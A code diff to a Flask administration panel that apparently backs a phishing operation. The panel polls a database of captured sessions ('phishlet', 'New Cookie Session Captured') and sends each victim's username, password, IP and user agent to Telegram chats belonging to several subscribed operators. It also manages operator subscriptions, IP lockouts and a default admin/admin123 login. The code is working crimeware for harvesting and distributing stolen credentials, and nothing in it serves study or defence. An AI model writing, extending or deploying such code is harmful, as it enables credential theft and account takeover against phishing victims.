@@ -19,12 +19,6 @@ from werkzeug.security import generate_password_hash, check_password_hash
 from notifications import send_telegram_notification, send_discord_notification, send_email_notification
 from database_reader import read_latest_session, get_all_sessions
 from session_processor import create_txt_file, format_session_message, process_all_tokens
-from admin_db import (
-    get_user_by_username, get_all_users, create_user, update_user_subscription,
-    update_user_ip_whitelist, update_user_ip_access, delete_user, get_locked_accounts,
-    migrate_from_json
-)
-import json
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -50,7 +44,7 @@ monitoring_status = {
 }
 
 # Processed sessions tracking
-processed_sessions = {}  # Track notified sessions: {session_id: last_notified_update_time}
+processed_sessions = {}
 session_message_map = {}
 
 # Helper functions
@@ -113,16 +107,58 @@ def save_config(config):
         print(f"Error saving config: {e}")
         return False
 
-# Legacy functions for backward compatibility (now use admin_db directly)
 def load_auth():
-    """Legacy function - returns empty dict structure for compatibility"""
-    # Try to migrate from JSON if exists
-    migrate_from_json()
-    return {"users": []}  # Not used anymore, but kept for compatibility
+    """Load authentication data - supports multiple users with roles"""
+    if AUTH_FILE.exists():
+        try:
+            with open(AUTH_FILE, 'r') as f:
+                data = json.load(f)
+                # Support both old format (single user) and new format (users list)
+                if isinstance(data, dict) and 'users' in data:
+                    return data
+                elif isinstance(data, dict) and 'username' in data:
+                    # Migrate old format to new format
+                    return {
+                        "users": [{
+                            "username": data.get("username", "admin"),
+                            "password": data.get("password", generate_password_hash("admin123")),
+                            "role": "super_admin"
+                        }]
+                    }
+                return data
+        except:
+            pass
+    
+    # Create default auth with super_admin
+    default_auth = {
+        "users": [{
+            "username": "admin",
+            "password": generate_password_hash("admin123"),
+            "role": "super_admin"
+        }]
+    }
+    save_auth(default_auth)
+    return default_auth
+
+def get_user_by_username(username):
+    """Get user by username from auth data"""
+    auth_data = load_auth()
+    users = auth_data.get("users", [])
+    for user in users:
+        if user.get("username") == username:
+            return user
+    return None
 
 def save_auth(auth_data):
-    """Legacy function - no-op, data is now in SQLite"""
-    return True  # Always return True for compatibility
+    """Save authentication data"""
+    try:
+        CONFIG_DIR.mkdir(parents=True, exist_ok=True)
+        with open(AUTH_FILE, 'w') as f:
+            json.dump(auth_data, f, indent=2)
+        return True
+    except Exception as e:
+        print(f"Error saving auth: {e}")
+        return False
 
 def login_required(f):
     """Decorator to require login with IP checking for normal admins"""
@@ -142,10 +178,12 @@ def login_required(f):
             allowed, message = check_ip_access(username, client_ip)
             
             if not allowed:
-                # Check if account is locked (using SQLite)
-                user = get_user_by_username(username)
+                # Check if account is locked
+                auth_data = load_auth()
+                users = auth_data.get('users', [])
+                user = next((u for u in users if u.get('username') == username), None)
                 
-                if user and bool(user.get('account_locked', 0)):
+                if user and user.get('account_locked', False):
                     session['account_locked'] = True
                     session.clear()  # Clear session on lockout
                     if request.path.startswith('/api/'):
@@ -192,65 +230,17 @@ def get_client_ip():
     else:
         return request.remote_addr
 
-def send_ip_warning_notification(username, client_ip, attempt_number, account_locked=False):
-    """Send Telegram notification for IP access warnings"""
-    try:
-        config = load_config()
-        
-        # Check if Telegram notifications are enabled
-        if not config.get("telegram_enable") or not config.get("telegram_token"):
-            return
-        
-        # Get Telegram chat ID (use user's personal chat_id if available, otherwise global)
-        telegram_chatid = config.get("telegr_chatid")
-        if not telegram_chatid:
-            return
-        
-        # Get customizable message templates (with proper MarkdownV2 escaping)
-        if attempt_number == 1:
-            message_template = config.get("ip_warning_first", 
-                "⚠️ *First Warning*\n\nUnauthorized IP access attempt detected for user: *{username}*\n\nIP Address: `{ip}`\n\nThis is your first warning\\. Please use an authorized IP address\\.\n\nRemaining attempts: *2*")
-        elif attempt_number == 2:
-            message_template = config.get("ip_warning_second",
-                "🔴 *Second Warning*\n\nUnauthorized IP access attempt detected for user: *{username}*\n\nIP Address: `{ip}`\n\nThis is your second warning\\. One more unauthorized attempt will result in account lockout\\.\n\nRemaining attempts: *1*")
-        else:  # account_locked = True
-            message_template = config.get("ip_warning_locked",
-                "🚫 *Account Locked*\n\nYour account has been locked due to unauthorized IP access attempts\\.\n\nUser: *{username}*\nUnauthorized IP: `{ip}`\n\nYour account has been locked after 3 unauthorized IP access attempts\\. Please contact support to restore access\\.")
-        
-        # Format message (escape username for MarkdownV2, IP is already in backticks in template)
-        message = message_template.replace("{username}", escape_markdownv2(username))
-        message = message.replace("{ip}", client_ip)  # IP is already in backticks in template, no need to escape
-        
-        # Get support Telegram if available
-        support_telegram = config.get("support_telegram")
-        
-        # For locked accounts, use "Contact Admin" button text
-        support_button_text = None
-        if account_locked and support_telegram:
-            support_button_text = "👤 Contact Admin"
-        
-        # Send notification
-        # For locked accounts, always include support_telegram if configured
-        from notifications import send_telegram_notification
-        result = send_telegram_notification(
-            chat_id=telegram_chatid,
-            token=config.get("telegram_token"),
-            message=message,
-            support_telegram=support_telegram,  # Will add button if support_telegram is configured
-            support_button_text=support_button_text  # Custom button text for locked accounts
-        )
-        
-        if result:
-            safe_print(f"[IP WARNING] Notification sent for {username} - Attempt {attempt_number}")
-        else:
-            safe_print(f"[IP WARNING] Failed to send notification for {username}")
-            
-    except Exception as e:
-        safe_print(f"[IP WARNING] Error sending notification: {e}")
-
 def check_ip_access(username, client_ip):
-    """Check if IP is allowed for user and track failed attempts - uses SQLite with transactions"""
-    user = get_user_by_username(username)
+    """Check if IP is allowed for user and track failed attempts"""
+    auth_data = load_auth()
+    users = auth_data.get('users', [])
+    
+    # Find user
+    user = None
+    for u in users:
+        if u.get('username') == username:
+            user = u
+            break
     
     if not user:
         return False, "User not found"
@@ -260,15 +250,11 @@ def check_ip_access(username, client_ip):
         return True, "Super admin - no IP restriction"
     
     # Check if account is locked
-    if user.get('account_locked', 0) == 1:
+    if user.get('account_locked', False):
         return False, "Account locked due to unauthorized IP access. Please contact support."
     
-    # Get allowed IPs for user (parse JSON)
-    allowed_ips_json = user.get('allowed_ips', '[]')
-    try:
-        allowed_ips = json.loads(allowed_ips_json) if allowed_ips_json else []
-    except:
-        allowed_ips = []
+    # Get allowed IPs for user
+    allowed_ips = user.get('allowed_ips', [])
     
     # If no IPs configured, allow all (backward compatibility)
     if not allowed_ips or len(allowed_ips) == 0:
@@ -276,45 +262,27 @@ def check_ip_access(username, client_ip):
     
     # Check if current IP is allowed
     if client_ip in allowed_ips:
-        # Reset failed attempts on successful access (using transaction)
-        update_user_ip_access(username, clear_failed=True)
+        # Reset failed attempts on successful access
+        if 'failed_ip_attempts' in user:
+            user['failed_ip_attempts'] = {}
+        save_auth(auth_data)
         return True, "IP allowed"
     
     # IP not allowed - track failed attempt
-    failed_attempts_json = user.get('failed_ip_attempts', '{}')
-    try:
-        failed_attempts = json.loads(failed_attempts_json) if failed_attempts_json else {}
-    except:
-        failed_attempts = {}
-    
+    failed_attempts = user.get('failed_ip_attempts', {})
     failed_attempts[client_ip] = failed_attempts.get(client_ip, 0) + 1
-    attempt_count = failed_attempts[client_ip]
+    user['failed_ip_attempts'] = failed_attempts
     
     # Lock account after 3 failed attempts from unauthorized IP
-    if attempt_count >= 3:
-        update_user_ip_access(
-            username,
-            failed_attempts=failed_attempts,
-            account_locked=True,
-            lock_reason=f"Account locked after 3 unauthorized IP access attempts from {client_ip}",
-            locked_at=datetime.now().isoformat()
-        )
-        
-        # Send final notification (account locked)
-        send_ip_warning_notification(username, client_ip, 3, account_locked=True)
-        
+    if failed_attempts[client_ip] >= 3:
+        user['account_locked'] = True
+        user['lock_reason'] = f"Account locked after 3 unauthorized IP access attempts from {client_ip}"
+        user['locked_at'] = datetime.now().isoformat()
+        save_auth(auth_data)
         return False, "Account locked after 3 unauthorized IP access attempts. Please contact support to restore access."
     
-    # Update failed attempts (using transaction)
-    update_user_ip_access(username, failed_attempts=failed_attempts)
-    
-    # Send warning notification based on attempt number
-    if attempt_count == 1:
-        send_ip_warning_notification(username, client_ip, 1)
-    elif attempt_count == 2:
-        send_ip_warning_notification(username, client_ip, 2)
-    
-    remaining = 3 - attempt_count
+    save_auth(auth_data)
+    remaining = 3 - failed_attempts[client_ip]
     return False, f"Unauthorized IP address. {remaining} attempt(s) remaining before account lockout."
 
 def ip_check_required(f):
@@ -342,7 +310,7 @@ def ip_check_required(f):
     return decorated_function
 
 def monitor_database():
-    """Background thread to monitor database for new sessions and updates"""
+    """Background thread to monitor database for new sessions"""
     global monitoring_status, processed_sessions
     
     config = load_config()
@@ -353,75 +321,30 @@ def monitor_database():
     
     while monitoring_status["active"]:
         try:
-            # Get all recent sessions (check last 20 to catch updates)
-            all_sessions = get_all_sessions(db_path, limit=20)
+            # Read latest session
+            latest_session = read_latest_session(db_path)
             
-            if all_sessions:
-                monitoring_status["last_check"] = datetime.now().isoformat()
+            if latest_session and latest_session.get("id", 0) != 0:
+                session_id = str(latest_session.get("id", 0))
                 
-                # Get the latest session (first one, highest ID)
-                latest_session = all_sessions[0] if all_sessions else None
-                latest_session_id = str(latest_session.get("id", 0)) if latest_session else None
-                
-                # First pass: Update tracking for all sessions (but don't send notifications yet)
-                updated_sessions = []
-                for session in all_sessions:
-                    if not session or session.get("id", 0) == 0:
-                        continue
+                # Check if this is a new session
+                if session_id not in processed_sessions:
+                    print(f"[MONITORING] 🆕 New session detected! ID: {session_id}")
+                    print(f"[MONITORING] Session details: username={latest_session.get('username', 'N/A')}, remote_addr={latest_session.get('remote_addr', 'N/A')}")
                     
-                    session_id = str(session.get("id", 0))
-                    current_update_time = session.get("update_time", 0)
+                    processed_sessions[session_id] = True
+                    monitoring_status["last_check"] = datetime.now().isoformat()
+                    monitoring_status["last_session_id"] = latest_session.get("id", 0)
                     
-                    # Check if this session has been notified before
-                    if session_id not in processed_sessions:
-                        # New session - track it
-                        processed_sessions[session_id] = current_update_time
-                        updated_sessions.append((session_id, session, False))  # False = new session
-                    else:
-                        # Session already notified - check if it has been updated
-                        last_notified_time = processed_sessions[session_id]
-                        
-                        if current_update_time > last_notified_time:
-                            # Session has been updated - update tracking
-                            processed_sessions[session_id] = current_update_time
-                            updated_sessions.append((session_id, session, True))  # True = updated session
-                
-                # Second pass: Only send notification for the latest session if it was updated
-                for session_id, session, is_updated in updated_sessions:
-                    # Only send notification if this is the latest session
-                    if session_id == latest_session_id:
-                        if is_updated:
-                            # Latest session was updated - send updated notification
-                            print(f"[MONITORING] 🔄 Latest session {session_id} updated! (update_time: {session.get('update_time', 0)})")
-                            print(f"[MONITORING] Session details: username={session.get('username', 'N/A')}, remote_addr={session.get('remote_addr', 'N/A')}")
-                            
-                            monitoring_status["last_session_id"] = session.get("id", 0)
-                            
-                            # Send updated notification
-                            print(f"[MONITORING] Re-sending notifications for updated latest session {session_id}...")
-                            send_notifications(session, is_updated=True)
-                            safe_print(f"[MONITORING] [OK] Updated notification sent for latest session {session_id}")
-                        else:
-                            # Latest session is new - send new session notification
-                            print(f"[MONITORING] 🆕 New latest session detected! ID: {session_id}")
-                            print(f"[MONITORING] Session details: username={session.get('username', 'N/A')}, remote_addr={session.get('remote_addr', 'N/A')}")
-                            print(f"[MONITORING] Update time: {session.get('update_time', 0)}")
-                            
-                            monitoring_status["last_session_id"] = session.get("id", 0)
-                            
-                            # Send new session notification
-                            print(f"[MONITORING] Calling send_notifications for new latest session {session_id}...")
-                            send_notifications(session, is_updated=False)
-                            safe_print(f"[MONITORING] [OK] Notification sent for new latest session {session_id}")
-                        break  # Only process the latest session
-                    else:
-                        # This is not the latest session - just update tracking silently
-                        if is_updated:
-                            print(f"[MONITORING] 📝 Session {session_id} updated (not latest, tracking only)")
-                        else:
-                            print(f"[MONITORING] 📝 New session {session_id} detected (not latest, tracking only)")
+                    # Send notifications
+                    print(f"[MONITORING] Calling send_notifications for session {session_id}...")
+                    send_notifications(latest_session)
+                    safe_print(f"[MONITORING] [OK] Notification sent for session {session_id}")
+                else:
+                    # Session already processed, just update check time
+                    monitoring_status["last_check"] = datetime.now().isoformat()
             else:
-                # No sessions found
+                # No session found or invalid session
                 monitoring_status["last_check"] = datetime.now().isoformat()
             
             time.sleep(30)  # Check every 30 seconds
@@ -445,24 +368,96 @@ def escape_markdownv2(text):
         result = result.replace(char, f'\\{char}')
     return result
 
-def send_notifications(session_data, is_updated=False):
-    """Send notifications for a new or updated session"""
+def send_notifications_to_all_admins(message, file_path=None, session_id=None, web_url=None, support_telegram=None, config=None):
+    """Send notification to all admins with configured Telegram settings"""
+    if config is None:
+        config = load_config()
+    
+    auth_data = load_auth()
+    users = auth_data.get("users", [])
+    
+    # Get global Telegram settings as fallback
+    global_telegram_token = config.get("telegram_token")
+    global_telegram_chatid = config.get("telegr_chatid")
+    
+    sent_count = 0
+    failed_count = 0
+    
+    # Send to all admins with configured Telegram settings
+    for user in users:
+        user_telegram_token = user.get("telegram_bot_token", "").strip()
+        user_telegram_chat_id = user.get("telegram_chat_id", "").strip()
+        setup_completed = user.get("setup_completed", False)
+        
+        # Determine which token and chat ID to use
+        if setup_completed and user_telegram_chat_id:
+            # Use admin's own bot token if set, otherwise use global token
+            bot_token = user_telegram_token if user_telegram_token else global_telegram_token
+            chat_id = user_telegram_chat_id
+            
+            if bot_token and chat_id:
+                try:
+                    message_id = send_telegram_notification(
+                        chat_id,
+                        bot_token,
+                        message,
+                        file_path=file_path,
+                        session_id=session_id,
+                        web_url=web_url,
+                        support_telegram=support_telegram
+                    )
+                    if message_id:
+                        sent_count += 1
+                        print(f"[NOTIFICATIONS] Sent to admin {user.get('username', 'N/A')} (chat_id: {chat_id})")
+                    else:
+                        failed_count += 1
+                        print(f"[NOTIFICATIONS] Failed to send to admin {user.get('username', 'N/A')}")
+                except Exception as e:
+                    failed_count += 1
+                    print(f"[NOTIFICATIONS] Error sending to admin {user.get('username', 'N/A')}: {e}")
+    
+    # Also send to global chat ID if configured (for backward compatibility)
+    if global_telegram_token and global_telegram_chatid:
+        # Check if we already sent to this chat ID (avoid duplicates)
+        already_sent = False
+        for user in users:
+            if user.get("telegram_chat_id", "").strip() == global_telegram_chatid:
+                already_sent = True
+                break
+        
+        if not already_sent:
+            try:
+                message_id = send_telegram_notification(
+                    global_telegram_chatid,
+                    global_telegram_token,
+                    message,
+                    file_path=file_path,
+                    session_id=session_id,
+                    web_url=web_url,
+                    support_telegram=support_telegram
+                )
+                if message_id:
+                    sent_count += 1
+                    print(f"[NOTIFICATIONS] Sent to global chat ID")
+            except Exception as e:
+                print(f"[NOTIFICATIONS] Error sending to global chat ID: {e}")
+    
+    return sent_count, failed_count
+
+def send_notifications(session_data):
+    """Send notifications for a new session"""
     import traceback
     
     try:
         config = load_config()
-        print(f"[NOTIFICATIONS] Starting notification for session ID: {session_data.get('id', 0)} (is_updated={is_updated})")
+        print(f"[NOTIFICATIONS] Starting notification for session ID: {session_data.get('id', 0)}")
         
         # No TXT file needed - just send message template
         txt_file_path = None
         
-        # Get notification template from config based on whether it's new or updated
-        if is_updated:
-            notification_template = config.get("notification_updated_cookie", 
-                "*🔄 Cookie Session Updated\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *Module:* `{phishlet}`\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Created:* `{create_time}`\n• *Updated:* `{update_time}`\n━━━━━━━━━━━━━━━━━━━━")
-        else:
-            notification_template = config.get("notification_incoming_cookie", 
-                "*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *Module:* `{phishlet}`\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Created:* `{create_time}`\n• *Updated:* `{update_time}`\n━━━━━━━━━━━━━━━━━━━━")
+        # Get notification template from config or use default
+        notification_template = config.get("notification_incoming_cookie", 
+            "*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *Module:* `{phishlet}`\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Timestamp:* `{time}`\n━━━━━━━━━━━━━━━━━━━━")
         
         # Format message using template with placeholders
         from datetime import datetime
@@ -473,25 +468,15 @@ def send_notifications(session_data, is_updated=False):
         useragent = session_data.get("useragent", "N/A")
         phishlet = session_data.get("phishlet", "N/A")
         create_time = session_data.get("create_time", 0)
-        update_time = session_data.get("update_time", 0)
         
-        # Format create timestamp
+        # Format timestamp
         if create_time:
             try:
-                create_time_str = datetime.fromtimestamp(create_time).strftime("%Y-%m-%d %H:%M:%S")
+                time_str = datetime.fromtimestamp(create_time).strftime("%Y-%m-%d %H:%M:%S")
             except:
-                create_time_str = str(create_time)
+                time_str = str(create_time)
         else:
-            create_time_str = "N/A"
-        
-        # Format update timestamp
-        if update_time:
-            try:
-                update_time_str = datetime.fromtimestamp(update_time).strftime("%Y-%m-%d %H:%M:%S")
-            except:
-                update_time_str = str(update_time)
-        else:
-            update_time_str = create_time_str if create_time else datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
         # Replace placeholders in template (escape values for MarkdownV2)
         message = notification_template.replace("{phishlet}", escape_markdownv2(str(phishlet)))
@@ -500,9 +485,7 @@ def send_notifications(session_data, is_updated=False):
         message = message.replace("{password}", escape_markdownv2(password))
         message = message.replace("{remote_addr}", escape_markdownv2(remote_addr))
         message = message.replace("{useragent}", escape_markdownv2(useragent))
-        message = message.replace("{create_time}", escape_markdownv2(create_time_str))
-        message = message.replace("{update_time}", escape_markdownv2(update_time_str))
-        message = message.replace("{time}", escape_markdownv2(update_time_str))  # Legacy support
+        message = message.replace("{time}", escape_markdownv2(time_str))
         
         # Check Telegram configuration
         telegram_enable = config.get("telegram_enable", False)
@@ -514,53 +497,37 @@ def send_notifications(session_data, is_updated=False):
         print(f"  - telegram_token: {'SET' if telegram_token else 'NOT SET'}")
         print(f"  - telegram_chatid: {'SET' if telegram_chatid else 'NOT SET'}")
         
-        # Send Telegram
-        if telegram_enable and telegram_token and telegram_chatid:
-            print(f"[NOTIFICATIONS] Attempting to send Telegram notification...")
+        # Send Telegram to all admins with configured settings
+        if telegram_enable:
+            print(f"[NOTIFICATIONS] Attempting to send Telegram notification to all admins...")
             try:
                 # Get web URL from config or use default
                 web_url = config.get("web_url", "http://localhost:5004")
                 support_telegram = config.get("support_telegram")
-                print(f"[NOTIFICATIONS] Sending to chat_id: {telegram_chatid}, web_url: {web_url}")
                 
-                print(f"[NOTIFICATIONS] Calling send_telegram_notification with:")
-                print(f"  - chat_id: {telegram_chatid}")
-                print(f"  - token: {'SET' if telegram_token else 'NOT SET'}")
-                print(f"  - message length: {len(message)} chars")
-                print(f"  - session_id: {session_id}")
-                print(f"  - web_url: {web_url}")
-                
-                # Send notification without file attachment - user can check details on UI
-                message_id = send_telegram_notification(
-                    telegram_chatid,
-                    telegram_token,
+                # Send to all admins
+                sent_count, failed_count = send_notifications_to_all_admins(
                     message,
                     file_path=None,  # No file attachment
                     session_id=session_id,
                     web_url=web_url,
-                    support_telegram=support_telegram
+                    support_telegram=support_telegram,
+                    config=config
                 )
                 
-                print(f"[NOTIFICATIONS] send_telegram_notification returned: {message_id}")
-                
-                if message_id:
-                    session_message_map[str(session_id)] = message_id
-                    safe_print(f"[NOTIFICATIONS] [OK] Telegram notification sent successfully! Message ID: {message_id}")
+                if sent_count > 0:
+                    session_message_map[str(session_id)] = sent_count  # Store count as message ID
+                    safe_print(f"[NOTIFICATIONS] [OK] Telegram notification sent to {sent_count} admin(s)!")
+                    if failed_count > 0:
+                        safe_print(f"[NOTIFICATIONS] [!] Failed to send to {failed_count} admin(s)")
                 else:
-                    safe_print(f"[NOTIFICATIONS] [X] Telegram notification failed - no message ID returned")
-                    safe_print(f"[NOTIFICATIONS] This means send_telegram_notification returned None or failed silently")
+                    safe_print(f"[NOTIFICATIONS] [X] Telegram notification failed - no admins received the message")
+                    safe_print(f"[NOTIFICATIONS] Make sure at least one admin has configured Telegram bot token and chat ID")
             except Exception as e:
                 safe_print(f"[NOTIFICATIONS] [X] Telegram error: {e}")
                 safe_print(f"[NOTIFICATIONS] Traceback: {traceback.format_exc()}")
         else:
-            missing = []
-            if not telegram_enable:
-                missing.append("telegram_enable is False")
-            if not telegram_token:
-                missing.append("telegram_token is not set")
-            if not telegram_chatid:
-                missing.append("telegr_chatid is not set")
-            safe_print(f"[NOTIFICATIONS] [!] Telegram notification skipped: {', '.join(missing)}")
+            safe_print(f"[NOTIFICATIONS] [!] Telegram notification skipped: telegram_enable is False")
         
         # Send Discord (without file attachment)
         if config.get("discord_enable") and config.get("discord_token") and config.get("discord_chat_id"):
@@ -649,9 +616,8 @@ def login():
                 allowed, message = check_ip_access(username, client_ip)
                 
                 if not allowed:
-                    # Check if account is locked (SQLite stores as integer 0/1)
-                    account_locked = bool(user.get('account_locked', 0))
-                    if account_locked:
+                    # Check if account is locked
+                    if user.get('account_locked', False):
                         config = load_config()
                         support_telegram = config.get("support_telegram", "")
                         support_msg = f" Contact support on Telegram: @{support_telegram}" if support_telegram else ""
@@ -691,8 +657,16 @@ def logout():
 @login_required
 def index():
     """Main dashboard page"""
-    # Pass user role to template
-    return render_template('index.html', user_role=session.get('role', 'admin'))
+    # Check if current admin needs setup
+    username = session.get('username')
+    user = get_user_by_username(username) if username else None
+    needs_setup = False
+    if user and user.get('role') == 'admin':
+        needs_setup = not user.get('setup_completed', False)
+    
+    # Pass user role and setup status to template
+    return render_template('index.html', user_role=session.get('role', 'admin'), 
+                         needs_setup=needs_setup, current_user=user)
 
 @app.route('/api/user/role', methods=['GET'])
 @login_required
@@ -726,6 +700,49 @@ def get_user_role():
         "subscription_status": subscription_status,
         "subscription_expired": is_expired
     })
+
+@app.route('/api/admin/setup', methods=['POST'])
+@login_required
+def api_admin_setup():
+    """API endpoint for admin Telegram setup (AJAX)."""
+    # Only allow normal admins
+    if session.get('role') == 'super_admin':
+        return jsonify({"status": "error", "message": "Super admins don't need setup"}), 403
+    
+    username = session.get('username')
+    if not username:
+        return jsonify({"status": "error", "message": "Not authenticated"}), 401
+    
+    user = get_user_by_username(username)
+    if not user:
+        return jsonify({"status": "error", "message": "Admin not found"}), 404
+    
+    # If already set up, return success
+    if user.get('setup_completed', False):
+        return jsonify({"status": "success", "message": "Already configured"})
+    
+    data = request.json or {}
+    telegram_bot_token = (data.get("telegram_bot_token") or "").strip()
+    telegram_chat_id = (data.get("telegram_chat_id") or "").strip()
+    
+    if not telegram_chat_id:
+        return jsonify({"status": "error", "message": "Telegram chat ID is required"}), 400
+    
+    # Update user config
+    auth_data = load_auth()
+    users = auth_data.get("users", [])
+    for i, u in enumerate(users):
+        if u.get("username") == username:
+            users[i]["telegram_bot_token"] = telegram_bot_token
+            users[i]["telegram_chat_id"] = telegram_chat_id
+            users[i]["setup_completed"] = True
+            auth_data["users"] = users
+            if save_auth(auth_data):
+                return jsonify({"status": "success", "message": "Telegram configuration saved successfully"})
+            else:
+                return jsonify({"status": "error", "message": "Failed to update configuration"}), 500
+    
+    return jsonify({"status": "error", "message": "User not found"}), 404
 
 @app.route('/api/config', methods=['GET'])
 @super_admin_required
@@ -956,31 +973,26 @@ def notifications():
 @app.route('/api/admins', methods=['GET'])
 @super_admin_required
 def get_all_admins():
-    """Get all admin users from SQLite"""
-    try:
-        users = get_all_users()
-        # Remove password and parse JSON fields
-        admin_list = []
-        for user in users:
-            admin_info = {
-                "username": user.get("username"),
-                "role": user.get("role", "admin"),
-                "subscription_expires": user.get("subscription_expires"),
-                "subscription_status": user.get("subscription_status", "active"),
-                "created_at": user.get("created_at"),
-                "account_locked": bool(user.get("account_locked", 0)),
-                "lock_reason": user.get("lock_reason"),
-                "locked_at": user.get("locked_at")
-            }
-            admin_list.append(admin_info)
-        return jsonify({"admins": admin_list})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+    """Get all admin users"""
+    auth_data = load_auth()
+    users = auth_data.get("users", [])
+    # Remove password from response
+    admin_list = []
+    for user in users:
+        admin_info = {
+            "username": user.get("username"),
+            "role": user.get("role", "admin"),
+            "subscription_expires": user.get("subscription_expires"),
+            "subscription_status": user.get("subscription_status", "active"),
+            "created_at": user.get("created_at")
+        }
+        admin_list.append(admin_info)
+    return jsonify({"admins": admin_list})
 
 @app.route('/api/admins', methods=['POST'])
 @super_admin_required
 def create_admin():
-    """Create a new admin user using SQLite"""
+    """Create a new admin user"""
     try:
         data = request.json
         username = data.get('username')
@@ -990,48 +1002,103 @@ def create_admin():
         if not username or not password:
             return jsonify({"status": "error", "message": "Username and password are required"}), 400
         
-        # Create user using SQLite (with transaction)
-        create_user(username, password, role='admin', subscription_days=subscription_days)
+        auth_data = load_auth()
+        users = auth_data.get("users", [])
         
-        return jsonify({"status": "success", "message": "Admin user created successfully"})
+        # Check if username already exists
+        if any(u.get('username') == username for u in users):
+            return jsonify({"status": "error", "message": "Username already exists"}), 400
+        
+        # Calculate subscription expiration date
+        from datetime import datetime, timedelta
+        expires_date = datetime.now() + timedelta(days=subscription_days)
+        
+        # Create new admin user
+        new_user = {
+            "username": username,
+            "password": generate_password_hash(password),
+            "role": "admin",
+            "subscription_expires": expires_date.isoformat(),
+            "subscription_status": "active",  # Default to active
+            "created_at": datetime.now().isoformat()
+        }
+        
+        users.append(new_user)
+        auth_data["users"] = users
+        
+        if save_auth(auth_data):
+            return jsonify({"status": "success", "message": "Admin user created successfully"})
+        else:
+            return jsonify({"status": "error", "message": "Failed to save user"}), 500
             
-    except ValueError as e:
-        return jsonify({"status": "error", "message": str(e)}), 400
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        return jsonify({"status": "error", "message": str(e)}), 400
 
 @app.route('/api/admins/<username>', methods=['PUT'])
 @super_admin_required
 def update_admin(username):
-    """Update admin user subscription using SQLite"""
+    """Update admin user subscription"""
     try:
         data = request.json
         subscription_days = data.get('subscription_days')
         subscription_status = data.get('subscription_status')
         
-        # Get current user to calculate days_added
-        user = get_user_by_username(username)
-        if not user:
+        auth_data = load_auth()
+        users = auth_data.get("users", [])
+        
+        user_found = False
+        old_status = None
+        old_expires = None
+        updated_user = None
+        days_added = None
+        for user in users:
+            if user.get('username') == username:
+                user_found = True
+                old_status = user.get('subscription_status', 'active')
+                old_expires = user.get('subscription_expires')
+                updated_user = user  # Keep reference to the user
+                
+                if subscription_days is not None:
+                    from datetime import datetime, timedelta
+                    # Calculate new expiry date
+                    if old_expires:
+                        try:
+                            old_date = datetime.fromisoformat(old_expires)
+                            # If old date is in the future, extend from there, otherwise from now
+                            if old_date > datetime.now():
+                                expires_date = old_date + timedelta(days=int(subscription_days))
+                                # Calculate days added
+                                days_added = int(subscription_days)
+                            else:
+                                expires_date = datetime.now() + timedelta(days=int(subscription_days))
+                                # Calculate days added from now
+                                days_added = int(subscription_days)
+                        except:
+                            expires_date = datetime.now() + timedelta(days=int(subscription_days))
+                            days_added = int(subscription_days)
+                    else:
+                        expires_date = datetime.now() + timedelta(days=int(subscription_days))
+                        days_added = int(subscription_days)
+                    
+                    user['subscription_expires'] = expires_date.isoformat()
+                
+                if subscription_status is not None:
+                    # Validate status
+                    if subscription_status in ['active', 'suspended', 'expired']:
+                        user['subscription_status'] = subscription_status
+                        # If setting to active, ensure it continues (don't change date)
+                        if subscription_status == 'active':
+                            # Keep existing expiration date, just activate
+                            pass
+                    else:
+                        return jsonify({"status": "error", "message": "Invalid subscription status"}), 400
+                break
+        
+        if not user_found:
             return jsonify({"status": "error", "message": "User not found"}), 404
         
-        old_status = user.get('subscription_status', 'active')
-        old_expires = user.get('subscription_expires')
-        days_added = None
-        
-        # Calculate days_added for notification
-        if subscription_days is not None and old_expires:
-            try:
-                from datetime import datetime, timedelta
-                old_date = datetime.fromisoformat(old_expires)
-                if old_date > datetime.now():
-                    days_added = int(subscription_days)
-            except:
-                pass
-        
-        # Update user using SQLite (with transaction)
-        updated_user = update_user_subscription(username, subscription_days, subscription_status)
-        
-        if updated_user:
+        auth_data["users"] = users
+        if save_auth(auth_data):
             try:
                 config = load_config()
                 if config.get("telegram_enable") and config.get("telegram_token") and config.get("telegr_chatid"):
@@ -1040,7 +1107,7 @@ def update_admin(username):
                     # Send notification if subscription was extended
                     if subscription_days is not None and days_added is not None and days_added > 0 and updated_user:
                         try:
-                            safe_print(f"[DEBUG] Sending extension notification: days_added={days_added}, username={username}, subscription_days={subscription_days}")
+                            print(f"[DEBUG] Sending extension notification: days_added={days_added}, username={username}, subscription_days={subscription_days}")
                             extension_template = config.get("notification_account_extension", 
                                 "*🎉 Subscription Extended\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Account:* `{username}`\n*Days Added:* `{days_added}`\n*New Expiry Date:* `{expiry_date}`\n*Status:* `{status}`\n━━━━━━━━━━━━━━━━━━━━")
                             
@@ -1057,27 +1124,26 @@ def update_admin(username):
                             message = message.replace("{expiry_date}", escape_markdownv2(expiry_date_str))
                             message = message.replace("{status}", escape_markdownv2(updated_user.get("subscription_status", "active")))
                             
-                            safe_print(f"[DEBUG] Extension notification message: {message[:150]}...")
-                            result = send_telegram_notification(
-                                config.get("telegr_chatid"),
-                                config.get("telegram_token"),
+                            print(f"[DEBUG] Extension notification message: {message[:150]}...")
+                            # Send extension notification to all admins
+                            sent_count, failed_count = send_notifications_to_all_admins(
                                 message,
                                 file_path=None,
-                                support_telegram=support_telegram
+                                session_id=None,
+                                web_url=None,
+                                support_telegram=support_telegram,
+                                config=config
                             )
-                            if result:
-                                safe_print(f"[OK] Extension notification sent successfully")
+                            if sent_count > 0:
